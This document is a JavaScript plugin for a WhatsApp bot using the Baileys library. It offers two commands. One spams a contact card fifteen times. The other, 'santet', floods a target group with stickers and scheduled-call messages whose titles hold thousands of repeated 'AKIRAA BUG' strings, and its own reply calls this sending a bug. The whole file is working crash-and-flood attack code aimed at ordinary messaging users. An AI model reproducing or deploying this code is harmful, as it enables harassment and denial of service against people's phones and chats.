const {
 proto,
generateWAMessageFromContent
 } = require('@adiwajshing/baileys')
let handler = async (m, { conn, text, usedPrefix, command, isOwner }) => {
  switch(command) {
case 'unlikon': {
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `${namebot}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:${namebot}\nFN:${namebot}\nitem1.TEL;waid=${nomorown}:${nomorown}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:My Name ${namebot} => Owner : ${nomorown}\nX-WA-BIZ-NAME: AKIRAA BOT ⚡⚡⚡\nEND:VCARD`

}
}), { userJid: m.chat, quoted: fkontak})
conn.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
await sleep(2000)
conn.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
await sleep(2000)
conn.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
await sleep(2000)
conn.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
await sleep(2000)
conn.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
await sleep(2000)
conn.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
await sleep(2000)
conn.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
await sleep(2000)
conn.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
await sleep(2000)
conn.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
await sleep(2000)
conn.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
await sleep(2000)
conn.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
await sleep(2000)
conn.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
await sleep(2000)
conn.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
await sleep(2000)
conn.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
await sleep(2000)
conn.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
await sleep(2000)
}
break
case 'santet': {
if (!isOwner) throw `❌ FITUR INI KHUSUS OWNER`
if (!text) throw `Masukan Id grup Tujuan`
let Pe = text
const cap = `\n⚡🔥 AKIRAA BUG 🔥\n`.repeat(99 * 99)
conn.sendMessage(Pe, { sticker : thumb }, { quoted: fkontak})
await sleep(2000)
conn.relayMessage(m.chat,{
scheduledCallCreationMessage: {
callType: "AUDIO",
scheduledTimestampMs: Date.now(),
title: cap
}}, {})
conn.sendMessage(Pe, { sticker : thumb }, { quoted: fkontak})
await sleep(2000)
conn.relayMessage(m.chat,{
scheduledCallCreationMessage: {
callType: "AUDIO",
scheduledTimestampMs: Date.now(),
title: cap
}}, {})
conn.sendMessage(Pe, { sticker : thumb }, { quoted: fkontak})
await sleep(2000)
conn.relayMessage(m.chat,{
scheduledCallCreationMessage: {
callType: "AUDIO",
scheduledTimestampMs: Date.now(),
title: cap
}}, {})
conn.sendMessage(Pe, { sticker : thumb }, { quoted: fkontak})
await sleep(2000)
conn.relayMessage(m.chat,{
scheduledCallCreationMessage: {
callType: "AUDIO",
scheduledTimestampMs: Date.now(),
title: cap
}}, {})
conn.sendMessage(Pe, { sticker : thumb }, { quoted: fkontak})
await sleep(2000)
conn.relayMessage(m.chat,{
scheduledCallCreationMessage: {
callType: "AUDIO",
scheduledTimestampMs: Date.now(),
title: cap
}}, {})
conn.sendMessage(Pe, { sticker : thumb }, { quoted: fkontak})
await sleep(2000)
conn.relayMessage(m.chat,{
scheduledCallCreationMessage: {
callType: "AUDIO",
scheduledTimestampMs: Date.now(),
title: cap
}}, {})
conn.sendMessage(Pe, { sticker : thumb }, { quoted: fkontak})
await sleep(2000)
conn.relayMessage(m.chat,{
scheduledCallCreationMessage: {
callType: "AUDIO",
scheduledTimestampMs: Date.now(),
title: cap
}}, {})
conn.sendMessage(Pe, { sticker : thumb }, { quoted: fkontak})
await sleep(2000)
conn.relayMessage(m.chat,{
scheduledCallCreationMessage: {
callType: "AUDIO",
scheduledTimestampMs: Date.now(),
title: cap
}}, {})
conn.sendMessage(Pe, { sticker : thumb }, { quoted: fkontak})
await sleep(2000)
conn.relayMessage(m.chat,{
scheduledCallCreationMessage: {
callType: "AUDIO",
scheduledTimestampMs: Date.now(),
title: cap
}}, {})
conn.sendMessage(Pe, { sticker : thumb }, { quoted: fkontak})
await sleep(2000)
conn.relayMessage(m.chat,{
scheduledCallCreationMessage: {
callType: "AUDIO",
scheduledTimestampMs: Date.now(),
title: cap
}}, {})
conn.sendMessage(Pe, { sticker : thumb }, { quoted: fkontak})
await sleep(2000)
conn.relayMessage(m.chat,{
scheduledCallCreationMessage: {
callType: "AUDIO",
scheduledTimestampMs: Date.now(),
title: cap
}}, {})
conn.sendMessage(Pe, { sticker : thumb }, { quoted: fkontak})
await sleep(2000)
conn.relayMessage(m.chat,{
scheduledCallCreationMessage: {
callType: "AUDIO",
scheduledTimestampMs: Date.now(),
title: cap
}}, {})
conn.sendMessage(Pe, { sticker : thumb }, { quoted: fkontak})
await sleep(2000)
conn.relayMessage(m.chat,{
scheduledCallCreationMessage: {
callType: "AUDIO",
scheduledTimestampMs: Date.now(),
title: cap
}}, {})
conn.sendMessage(Pe, { sticker : thumb }, { quoted: fkontak})
await sleep(2000)
conn.relayMessage(m.chat,{
scheduledCallCreationMessage: {
callType: "AUDIO",
scheduledTimestampMs: Date.now(),
title: cap
}}, {})
conn.sendMessage(Pe, { sticker : thumb }, { quoted: fkontak})
await sleep(2000)
conn.relayMessage(m.chat,{
scheduledCallCreationMessage: {
callType: "AUDIO",
scheduledTimestampMs: Date.now(),
title: cap
}}, {})
conn.sendMessage(Pe, { sticker : thumb }, { quoted: fkontak})
await sleep(2000)
conn.relayMessage(m.chat,{
scheduledCallCreationMessage: {
callType: "AUDIO",
scheduledTimestampMs: Date.now(),
title: cap
}}, {})
conn.sendMessage(Pe, { sticker : thumb }, { quoted: fkontak})
await sleep(2000)
conn.relayMessage(m.chat,{
scheduledCallCreationMessage: {
callType: "AUDIO",
scheduledTimestampMs: Date.now(),
title: cap
}}, {})
conn.sendMessage(Pe, { sticker : thumb }, { quoted: fkontak})
await sleep(2000)
conn.relayMessage(m.chat,{
scheduledCallCreationMessage: {
callType: "AUDIO",
scheduledTimestampMs: Date.now(),
title: cap
}}, {})
conn.sendMessage(Pe, { sticker : thumb }, { quoted: fkontak})
await sleep(2000)
conn.relayMessage(m.chat,{
scheduledCallCreationMessage: {
callType: "AUDIO",
scheduledTimestampMs: Date.now(),
title: cap
}}, {})
conn.sendMessage(Pe, { sticker : thumb }, { quoted: fkontak})
await sleep(2000)
conn.relayMessage(m.chat,{
scheduledCallCreationMessage: {
callType: "AUDIO",
scheduledTimestampMs: Date.now(),
title: cap
}}, {})
conn.sendMessage(Pe, { sticker : thumb }, { quoted: fkontak})
await sleep(2000)
conn.relayMessage(m.chat,{
scheduledCallCreationMessage: {
callType: "AUDIO",
scheduledTimestampMs: Date.now(),
title: cap
}}, {})
conn.sendMessage(Pe, { sticker : thumb }, { quoted: fkontak})
await sleep(2000)
conn.relayMessage(m.chat,{
scheduledCallCreationMessage: {
callType: "AUDIO",
scheduledTimestampMs: Date.now(),
title: cap
}}, {})
conn.sendMessage(Pe, { sticker : thumb }, { quoted: fkontak})
await sleep(2000)
conn.relayMessage(m.chat,{
scheduledCallCreationMessage: {
callType: "AUDIO",
scheduledTimestampMs: Date.now(),
title: cap
}}, {})
m.reply(`*Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah*`)
}
break
}
}
handler.command = handler.help = ["unlikon","santet"]
handler.tags = ["hw"]
module.exports = handler

async function sleep(delay) {
  return new Promise(resolve => setTimeout(resolve, delay));
}